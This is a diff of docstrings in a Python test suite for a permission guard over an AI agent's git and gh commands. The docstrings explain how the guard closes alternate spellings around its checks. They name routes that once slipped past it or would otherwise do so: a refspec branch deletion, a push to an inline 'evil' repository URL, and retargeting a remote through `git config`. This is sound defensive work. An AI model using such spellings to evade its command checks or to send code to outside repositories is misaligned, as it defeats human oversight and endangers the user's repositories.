@@ -47,10 +47,10 @@ def test_the_offered_defaults_produce_an_agent_that_can_read() -> None:
 def test_git_s_object_store_queries_are_reads() -> None:
     """Probing a merge is how an agent checks a branch before touching it.
 
-    `git merge-tree` was refused as "not classified as read-only or
-    reversible" while the resolver's own refresh ran it to predict every
-    lease merge — so nothing an agent could run reproduced what the tool
-    it was operating had just decided.
+    The resolver's own refresh runs `git merge-tree` to predict every lease
+    merge, so refusing it as "not classified as read-only or reversible"
+    would leave nothing an agent can run that reproduces what the tool it
+    operates has just decided.
     """
     rules = default_vocabulary()
 
@@ -110,10 +110,9 @@ def test_integration_branches_move_only_the_leased_force_onto_them() -> None:
 def test_a_refspec_reaches_the_same_guard_its_flag_spelling_does() -> None:
     """Push spells both guarded effects twice, and both spellings are guarded.
 
-    Measured before the refspec half existed: `git push origin
-    :refs/heads/main` deletes the same ref `--delete` does and was allowed,
-    while `--delete` asked. A guard listing flag spellings held one half of
-    each effect.
+    `git push origin :refs/heads/main` deletes the same ref `--delete` does,
+    so a guard listing flag spellings alone would allow it while `--delete`
+    asks, holding one half of each effect.
     """
     guarded = [git_rule()]
 
@@ -138,11 +137,11 @@ def test_a_refspec_reaches_the_same_guard_its_flag_spelling_does() -> None:
 def test_a_push_destination_named_inline_reaches_a_guard_no_remote_holds() -> None:
     """A repository spelled into the command line needs no remote at all.
 
-    Measured before this half existed: `git push git@github.com:evil/x.git
-    main` allowed, while every route through the remote table — `git remote
-    add`, `git remote rename`, `git config remote.*.url`, `git -c
-    remote.origin.url=` — asks. The destination named inline reaches the same
-    place without a table entry to guard, and so past all of them.
+    Every route through the remote table — `git remote add`, `git remote
+    rename`, `git config remote.*.url`, `git -c remote.origin.url=` — asks.
+    `git push git@github.com:evil/x.git main` names its destination inline
+    and reaches the same place without a table entry to guard, so unguarded
+    it would go past all of them.
     """
     guarded = [git_rule()]
     mirroring = [git_rule(push_destinations=("url",))]
@@ -246,8 +245,8 @@ def test_a_config_write_asks_only_where_the_key_names_a_program() -> None:
     The row's reason is that `git config` can change how commands execute,
     which is true of `core.hooksPath` and false of `user.email` or of the
     base branch this repository records per worktree. Asking about all of
-    them spent the question on writes it did not describe, which is how a
-    prompt becomes something to click through rather than to read.
+    them would spend the question on writes it does not describe, which is
+    how a prompt becomes something to click through rather than to read.
     """
     rules = default_vocabulary()
 
@@ -292,15 +291,14 @@ def test_a_guarded_config_key_is_matched_without_regard_to_case() -> None:
 
 
 def test_a_write_that_retargets_the_repository_asks_in_every_spelling() -> None:
-    """One operation spelled two ways was answered two ways.
+    """One operation spelled two ways is answered one way.
 
-    `git remote set-url origin <url>` asked and `git config remote.origin.url
-    <url>` allowed, which is the same byte written to the same file. It is
-    also what `gh` reads to decide which repository an issue comment, a close
-    or a pull request is about, so the allowed spelling aimed the whole
-    compensable forge band at any repository on the forge without a question
-    anywhere in the chain -- while `--repo`, the flag that says the same thing
-    out loud, was guarded.
+    `git remote set-url origin <url>` and `git config remote.origin.url <url>`
+    write the same byte to the same file. It is also what `gh` reads to decide
+    which repository an issue comment, a close or a pull request is about, so
+    allowing either spelling would aim the whole compensable forge band at any
+    repository on the forge without a question anywhere in the chain -- while
+    `--repo`, the flag that says the same thing out loud, is guarded.
     """
     rules = default_vocabulary()
 
@@ -509,13 +507,13 @@ def test_compensable_collaboration_allows_and_the_events_do_not() -> None:
 
 
 def test_an_attestation_is_not_compensable_even_though_it_can_be_dismissed() -> None:
-    """What a review did was say something in the caller's name.
+    """What a review does is say something in the caller's name.
 
     Saying something else later is not unsaying it, which is why the two
     verdict-carrying spellings ask and the one that carries neither allows.
     Both short forms are guarded beside the long ones, because a guard written
-    as one spelling of an effect holds half of it — the shape a push guard had
-    before refspec grammar was read structurally.
+    as one spelling of an effect holds half of it — as a push guard reading
+    flags without refspec grammar would.
     """
     rules = [gh_rule()]
 
@@ -560,8 +558,8 @@ def test_what_reaches_outside_this_repository_is_answered_by_a_person() -> None:
 def test_every_gh_question_says_which_rule_reached_it() -> None:
     """An ask nobody can attribute is one nobody can tune.
 
-    Measured before rule ids existed: 860 asks with no recorded reason at all,
-    and a native tool name that answers `Bash` for every one of them.
+    Without a rule id an ask records no reason at all, and the native tool name
+    answers `Bash` for every one of them.
     """
     asked = verdict("gh pr merge 12 --admin", [gh_rule()])
 
@@ -634,8 +632,8 @@ def test_a_guarded_config_key_named_alone_is_looked_up_rather_than_set() -> None
 def test_the_config_verbs_git_added_read_and_write_as_their_flags_do() -> None:
     """`git config get` is `--get`, and `git config edit` is `--edit`.
 
-    Before these verbs were read, `edit` named no guarded key and was allowed
-    though it opens every key at once, and `get` of a guarded key asked.
+    Unread as verbs, `edit` names no guarded key and would be allowed though
+    it opens every key at once, while `get` of a guarded key would ask.
     """
     rules = [git_rule()]
 
@@ -677,11 +675,11 @@ def test_a_merge_printed_rather_than_written_is_a_read() -> None:
 
 
 def test_a_gh_api_write_answers_as_the_typed_verb_reaching_it() -> None:
-    """One write spelled two ways was answered two ways.
+    """One write spelled two ways is answered one way.
 
-    `gh_rule(allow_filing=False)` made `gh issue create` ask while `gh api
-    repos/{owner}/{repo}/issues -f title=x` still filed the same issue
-    unasked, because the routes were never handed the vocabulary's rows.
+    `gh_rule(allow_filing=False)` makes `gh issue create` ask, and `gh api
+    repos/{owner}/{repo}/issues -f title=x` files the same issue, so it asks
+    too: the routes are handed the vocabulary's rows.
     """
     filing = [gh_rule()]
     publishing = [gh_rule(allow_filing=False, allow_authoring=False)]
